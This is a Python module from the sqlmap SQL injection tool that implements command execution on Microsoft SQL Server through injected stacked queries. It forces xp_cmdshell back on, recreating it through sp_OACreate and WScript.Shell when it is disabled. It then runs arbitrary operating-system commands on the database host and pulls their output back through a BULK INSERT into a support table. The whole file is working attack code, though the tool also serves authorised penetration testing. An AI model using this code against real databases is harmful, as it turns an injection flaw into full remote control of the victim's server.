#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2010 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.common import backend
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import wasLastRequestDelayed
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.core.unescaper import unescaper
from lib.request import inject

class xp_cmdshell:
    """
    This class defines methods to deal with Microsoft SQL Server
    xp_cmdshell extended procedure for plugins.
    """

    def __init__(self):
        self.xpCmdshellStr = "master..xp_cmdshell"

    def __xpCmdshellCreate(self):
        cmd = ""

        if backend.isVersionWithin(("2005", "2008")):
            logger.debug("activating sp_OACreate")

            cmd += "EXEC master..sp_configure 'show advanced options', 1; "
            cmd += "RECONFIGURE WITH OVERRIDE; "
            cmd += "EXEC master..sp_configure 'ole automation procedures', 1; "
            cmd += "RECONFIGURE WITH OVERRIDE; "
            inject.goStacked(cmd)

        self.__randStr = randomStr(lowercase=True)

        cmd += "DECLARE @%s nvarchar(999); " % self.__randStr
        cmd += "set @%s='" % self.__randStr
        cmd += "CREATE PROCEDURE xp_cmdshell(@cmd varchar(255)) AS DECLARE @ID int "
        cmd += "EXEC sp_OACreate ''WScript.Shell'', @ID OUT "
        cmd += "EXEC sp_OAMethod @ID, ''Run'', Null, @cmd, 0, 1 "
        cmd += "EXEC sp_OADestroy @ID'; "
        cmd += "EXEC master..sp_executesql @%s;" % self.__randStr

        if backend.isVersionWithin(("2005", "2008")):
            cmd += " RECONFIGURE WITH OVERRIDE;"

        inject.goStacked(cmd)

    def __xpCmdshellConfigure2005(self, mode):
        debugMsg  = "configuring xp_cmdshell using sp_configure "
        debugMsg += "stored procedure"
        logger.debug(debugMsg)

        cmd  = "EXEC master..sp_configure 'show advanced options', 1; "
        cmd += "RECONFIGURE WITH OVERRIDE; "
        cmd += "EXEC master..sp_configure 'xp_cmdshell', %d " % mode
        cmd += "RECONFIGURE WITH OVERRIDE; "
        cmd += "EXEC sp_configure 'show advanced options', 0"

        return cmd

    def __xpCmdshellConfigure2000(self, mode):
        debugMsg  = "configuring xp_cmdshell using sp_addextendedproc "
        debugMsg += "stored procedure"
        logger.debug(debugMsg)

        if mode == 1:
            cmd  = "EXEC master..sp_addextendedproc 'xp_cmdshell', "
            cmd += "@dllname='xplog70.dll'"
        else:
            cmd = "EXEC master..sp_dropextendedproc 'xp_cmdshell'"

        return cmd

    def __xpCmdshellConfigure(self, mode):
        if backend.isVersionWithin(("2005", "2008")):
            cmd = self.__xpCmdshellConfigure2005(mode)
        else:
            cmd = self.__xpCmdshellConfigure2000(mode)

        inject.goStacked(cmd)

    def __xpCmdshellCheck(self):
        cmd = self.xpCmdshellForgeCmd("ping -n %d 127.0.0.1" % (conf.timeSec * 2))

        inject.goStacked(cmd)

        return wasLastRequestDelayed()

    def xpCmdshellForgeCmd(self, cmd):
        self.__randStr = randomStr(lowercase=True)
        self.__cmd = unescaper.unescape("'%s'" % cmd)
        self.__forgedCmd = "DECLARE @%s VARCHAR(8000); " % self.__randStr
        self.__forgedCmd += "SET @%s = %s; " % (self.__randStr, self.__cmd)
        self.__forgedCmd += "EXEC %s @%s" % (self.xpCmdshellStr, self.__randStr)

        return self.__forgedCmd

    def xpCmdshellExecCmd(self, cmd, silent=False):
        cmd = self.xpCmdshellForgeCmd(cmd)
        inject.goStacked(cmd, silent)

    def xpCmdshellEvalCmd(self, cmd, first=None, last=None):
        self.getRemoteTempPath()

        tmpFile = "%s/tmpc%s.txt" % (conf.tmpPath, randomStr(lowercase=True))
        cmd = "%s > %s" % (cmd, tmpFile)

        self.xpCmdshellExecCmd(cmd)

        inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.cmdTblName, tmpFile, randomStr(10), randomStr(10)))

        self.delRemoteFile(tmpFile)

        output = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False, sort=False, firstChar=first, lastChar=last)
        inject.goStacked("DELETE FROM %s" % self.cmdTblName)

        if isinstance(output, (list, tuple)):
            output = output[0]

            if isinstance(output, (list, tuple)):
                output = output[0]

        return output

    def xpCmdshellInit(self):
        self.__xpCmdshellAvailable = False

        infoMsg  = "checking if xp_cmdshell extended procedure is "
        infoMsg += "available, please wait.."
        logger.info(infoMsg)

        result = self.__xpCmdshellCheck()

        if result:
            logger.info("xp_cmdshell extended procedure is available")
            self.__xpCmdshellAvailable = True

        else:
            message  = "xp_cmdshell extended procedure does not seem to "
            message += "be available. Do you want sqlmap to try to "
            message += "re-enable it? [Y/n] "
            choice   = readInput(message, default="Y")

            if not choice or choice in ("y", "Y"):
                self.__xpCmdshellConfigure(1)

                if self.__xpCmdshellCheck():
                    logger.info("xp_cmdshell re-enabled successfully")
                    self.__xpCmdshellAvailable = True

                else:
                    logger.warn("xp_cmdshell re-enabling failed")

                    logger.info("creating xp_cmdshell with sp_OACreate")
                    self.__xpCmdshellConfigure(0)
                    self.__xpCmdshellCreate()

                    if self.__xpCmdshellCheck():
                        logger.info("xp_cmdshell created successfully")
                        self.__xpCmdshellAvailable = True

                    else:
                        warnMsg  = "xp_cmdshell creation failed, probably "
                        warnMsg += "because sp_OACreate is disabled"
                        logger.warn(warnMsg)

        if not self.__xpCmdshellAvailable:
            errMsg = "unable to proceed without xp_cmdshell"
            raise sqlmapUnsupportedFeatureException, errMsg

        debugMsg  = "creating a support table to write commands standard "
        debugMsg += "output to"
        logger.debug(debugMsg)

        self.createSupportTbl(self.cmdTblName, self.tblField, "varchar(8000)")
